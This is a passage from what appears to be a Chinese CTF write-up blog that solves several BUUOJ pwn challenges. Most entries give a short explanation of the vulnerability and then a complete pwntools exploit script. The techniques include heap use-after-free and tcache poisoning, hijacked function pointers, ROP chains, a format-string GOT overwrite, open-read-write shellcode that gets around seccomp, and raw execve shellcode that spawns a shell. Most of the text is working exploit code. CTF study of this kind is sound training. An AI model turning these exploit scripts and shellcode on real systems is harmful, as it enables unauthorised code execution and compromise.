<code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p><p>且<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>如图，把这里的函数指针控制成<code>sh\x00\00</code> + <code>&amp;system</code> ,即执行<code>do_del</code>时，运行的就是<code>system(sh)</code>可拿到shell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_n_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26453)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def new(id,type,len,context):    sla(&quot;CNote &gt;&quot;,&#39;1&#39;)    sla(&quot;dex &gt;&quot;,str(id))    sla(&quot;Type &gt;&quot;,str(type))    sla(&quot;th &gt;&quot;,str(len))    sa(&quot;ue &gt;&quot;,str(context))def free(id):    sla(&quot;CNote &gt;&quot;,&#39;2&#39;)    sla(&quot;dex &gt;&quot;,str(id))def show(id):    sla(&quot;CNote &gt;&quot;,&#39;3&#39;)    sla(&quot;dex &gt;&quot;,str(id))payload = &quot;a&quot; + &#39;\n&#39;new(0,2,0x40,payload)new(1,2,0x40,payload)free(1)free(0)system = elf.plt[&#39;system&#39;]new(2,2,0x9,&#39;sh\x00\x00&#39;+ p32(system))free(1)itr()</code></pre><h4 id="无system函数情况下"><a href="#无system函数情况下" class="headerlink" title="无system函数情况下"></a>无system函数情况下</h4><p>Leak libc，还是攻击那一个函数指针，本地通远程没通。</p><p>在测试的时候，由于fgets总是在你传入的字符串后加上<code>\x00</code>，曾经就遇到<br>过，导致泄漏十分难进行，但是发现：</p><pre><code class="python">payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8</code></pre><p>传入空字节竟然可以通过，且没有加上<code>\x00</code>，从而不影响泄漏libc。还不知道是否以后遇到fgets函数就可以这样处理其影响，先挖个坑，记录着。</p><pre><code class="python">payload = &#39;a&#39; + &#39;\n&#39;new(0,2,0x400,payload)new(1,2,0x400,payload)free(0)payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8info_addr(&quot;libc_base&quot;,libc_base)payload = &#39;\x00&#39;*4 + &#39;/bin/sh\x00&#39; +&#39;\n&#39;new(3,2,0x400-0x10-0x10,payload)new(4,2,0x40,payload)new(5,2,0x40,payload)free(5)free(4)rec = libc_base + 0x3d123new(6,2,0x9,p32(rec) + p32(rec))# free(5)show(5)# debug()itr()</code></pre><h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞，tcache dup攻击。</p><p>考点：</p><ul><li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li><li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li></ul><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_easyTHeap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc-2.27.so&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25814)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&quot;choice&quot;,&#39;1&#39;)    sla(&quot;?&quot;,str(size))def edit(idx,context):    sla(&quot;choice&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;content&#39;,str(context))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&quot;idx&quot;,str(idx))add(0x100) #0add(0x100) #1free(0)free(0)show(0)r()heapbase = uu64(r(6)) - 0x260info_addr(&#39;heapbase&#39;,heapbase)add(0x100) #2edit(2,p64(heapbase+0x10))add(0x100) #3add(0x100) #4edit(4,&#39;\x07&#39;*0x10)free(0)show(0)r()libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)__malloc_hook = libc_base + 0x3ebc30__realloc_hook = __malloc_hook -0x8payload = &#39;\x00&#39; * (8+7) + &#39;\x01&#39; + &#39;\x00&#39; * (0x80 - 8 - 8) + &#39;\x00&#39; * 0x38 + p64(__realloc_hook)edit(4,payload)add(0x100) #5onerec = 0x10a38c + libc_baserealloc_addr = libc_base + libc.symbols[&#39;__libc_realloc&#39;]info_addr(&#39;relloc&#39;,realloc_addr)info_addr(&#39;__malloc_hook&#39;,__malloc_hook)payload = p64(onerec) + p64(realloc_addr+8)edit(5,payload)add(0x100)#debug()itr()</code></pre><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18，保护全开，存在uaf漏洞。</p><p>程序只有增加和删除的功能，但是增加一个堆块后回给你返回申请堆块的地址信息。</p><pre><code class="c"> printf(&quot;gift :%p\n&quot;, heaplist[HIDWORD(size)]);</code></pre><p>删除堆后，没有置0的操作，存在uaf。</p><p>考点：</p><ul><li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li><li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。</li></ul><p>难点：</p><ul><li>泄漏libc地址</li><li>精巧的构造一个任意地址写（在<code>tcache struct</code>处折腾）</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_final_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27714)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,content):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;index&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;thing&#39;,str(content))    ru(&quot;0x&quot;)    gift = int(r(12),16)    info_addr(&#39;gift&#39;,gift)    return giftdef free(idx):    sla(&quot;&gt;&quot;,&#39;2&#39;)    sla(&quot;index&quot;,str(idx))heap_base = add(0,0x48,&#39;a&#39;) - 0x11e70free(0)free(0)add(1,0x48,p64(heap_base+0x10))add(2,0x48,p64(heap_base+0x10))payload = 0x30 * &#39;\x07&#39;add(3,0x48,payload)free(3)payload = 0x30 * &#39;\x00&#39;add(4,0x48,payload)add(5,0x10,&#39; &#39;)libc_base = add(6,0x78,&#39; &#39;) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8free(5)add(7,0x10,p64(free_hook)*2)one_rec = 0x4f322 + libc_baseadd(8,0x48,p64(one_rec))# debug()free(4)itr()</code></pre><p>调试一下就懂了。其中0x10那个堆块的申请很重要，正好可以供后面的使用。</p><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>只是一个简单的rop，考的就是32位下如何控制传参数。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_rop_chain&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29550)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;] #,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win_function1 = 0x080485CBwin_function2 = 0x80485D8flag = 0x0804862Boffset = 0x18 + 4ru(&#39;Enter your input&gt;&#39;)payload = &#39;a&#39; * offset + flat([win_function1,win_function2,flag,0xBAAAAAAD,0xDEADBAAD])# debug()s(payload + &#39;\n&#39;)itr()</code></pre><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>考点 ：</p><ul><li>简单shellcode 的编写</li><li>seccomp（挖坑）</li></ul><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p><p>先用<code>seccomp-tools</code>看下禁用了什么函数：</p><pre><code>➜  pwnable_orw seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>明显只能执行 open read wirte 函数。</p><pre><code>#这里可以用pwntools库的一个函数代替,shellcraftc语言:open(&quot;/home/orw/flag&quot;) &lt;==&gt; 汇编:asm(shellcraft.open(&quot;/home/orw/flag&quot;))c语言:read(3,buf,0x20)&lt;==&gt; 汇编:asm(shellcraft.read(3,&quot;esp&quot;,0x20)c语言:write(1,buf,0x20)&lt;==&gt;汇编:asm(shellcraft.write(1,&quot;esp&quot;,0x20))</code></pre><p>其中 就是以esp当做临时变量 buf的地址，其可以自定义。</p><p>其中open函数执行后，由于是打开了一个新的文件，其返回的fd就是3，所以后面跟着的read的文件描述符也为3。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./orw&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26224)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()bss = 0x804A128 - 0x30payload= asm(shellcraft.open(&quot;./flag&quot;))payload += asm(shellcraft.read(3,bss,0x30))payload += asm(shellcraft.write(1,bss,0x30))sl(payload)itr()</code></pre><h2 id="V-amp-N2020-公开赛warmup"><a href="#V-amp-N2020-公开赛warmup" class="headerlink" title="V&amp;N2020 公开赛warmup"></a>V&amp;N2020 公开赛warmup</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>开启了沙盒，使用orw获取flag即可。</p><pre><code>Here is my gift: 0x7f411f85c9c0 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><p>其中，这题因为只有<code>0x10</code>的溢出空间，猛的一看需要栈迁移，但是会发现不知道往哪里迁移。看了师傅们的博客才知道，由于第一个栈空间较大，且与第二个可以溢出的栈是<strong>紧邻</strong>的。然后，就可以在溢出时覆盖一下返回地址，覆盖为ret，这样就可以多一个ret，从而<strong>接着执行</strong>上一个栈帧buf里面构造的rop链。</p><p>并且在orw中，open函数的第一个参数时一个指针地址(<code>*filename</code>)，所以需要先read一下flag的文件名到一个buf当中，然后再进行orw。</p><p>Buf的寻找：<br>在libc中找一个没有用到的地址段即可。比如<code>__free_hook</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_warmup&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27585)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&#39;0x&#39;)libc_base = int(r(12),16) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)pop_rdi = 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_baseopen = libc_base+libc.sym[&#39;open&#39;]read = libc_base+libc.sym[&#39;read&#39;]puts = libc_base+libc.sym[&#39;puts&#39;]buf = libc_base+libc.sym[&#39;__free_hook&#39;]payload = flat([    pop_rdi,0,pop_rsi,buf,pop_rdx,8,read,    pop_rdi,buf,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,buf,pop_rdx,0x30,read,    pop_rdi,buf,puts])sa(&#39;:&#39;,payload)# debug()ret = libc_base + 0x0000000000000937payload = &#39;a&#39; * 0x78 + p64(ret)sa(&#39;?&#39;,payload)sleep(1)# debug()s(&#39;./flag\x00\x00&#39;)itr()</code></pre><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>简单的栈溢出，且存在后门。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_buffer_overflow_1&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29988)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win = 0x080485CBoffset = 0x28 + 0x4payload = &#39;a&#39;*offset + p32(win)sa(&#39;:&#39;,payload)itr()</code></pre><h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>类似上题，考个控制传参。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_buffer_overflow_2&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29988)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win = 0x80485CBoffset = 0x6c + 0x4payload = &#39;a&#39;*offset + p32(win) + p32(0xDEADBEEF) + p32(0xDEADBEEF) + p32(0xDEADC0DE)s(payload)</code></pre><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32位的格式化字符串，考的是单次printf多次写入，因为是32位pwntools的<code>fmtstr_payload</code>是十分好用的。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./axb_2019_fmt32&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29147)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()printf_got = 0x804A014payload = &quot;%9$sA&quot; + p32(0x804A014)sla(&#39;me:&#39;,payload)ru(&#39;Repeater:&#39;)printf_got = uu32(r(4))libc_base = printf_got - 0x049020info_addr(&#39;libc_base&#39;,libc_base)offset = 8rce = libc_base + 0x3a80cinfo_addr(&#39;rec&#39;,rce)payload = &#39;a&#39; + fmtstr_payload(offset,{0x804A014:rce},write_size = &quot;byte&quot;,numbwritten = 10)sla(&#39;me:&#39;,payload)itr()</code></pre><h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>32位，无任何保护，作者自己汇编写的程序。<br>分析汇编以后可以认为就是：</p><pre><code class="c">write(1,esp,20)read(0,esp,60)</code></pre><p>十分明显的栈溢出，但是难点在shellcode摆上栈以后，如何跳转过去执行。</p><p>利用思路：</p><ul><li>利用控制eip，返回wirte处，泄漏一下栈地址，然后根据偏移算出esp的地址</li><li>摆shellcode上栈，控制好eip</li></ul><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./start&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27834)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &#39;a&#39; * 0x14 + p32(0x08048087)sa(&quot;:&quot;,payload)new_esp = uu32(r(4)) - 4addr_shellcode = new_esp + 0x14 + 4info_addr(&#39;new esp&#39;,new_esp)shellcode  = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;shellcode += &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;shellcode += &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;s(&#39;a&#39; * 0x14 + p32(addr_shellcode) + shellcode)itr()</code></pre><p>Shell code 网上一找有很多，找到一个合适字节限制，且可以执行的即可。</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>做法跟 <code>cmcc_simplerop</code>基本一样，除了偏移。</p><p>32位下，<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> 行不通。（上来测试这个，测试一阵子）</p><h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>慢慢分析可以发现一个溢出点，且利用此处只是可以做到任意地址的数据减1。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p><p>然后想到可以在got表处下手，<strong>其中printf、system函数在程序达到一定条件才会运行。所以其got处的值是特定的，并且是相近的。</strong></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" 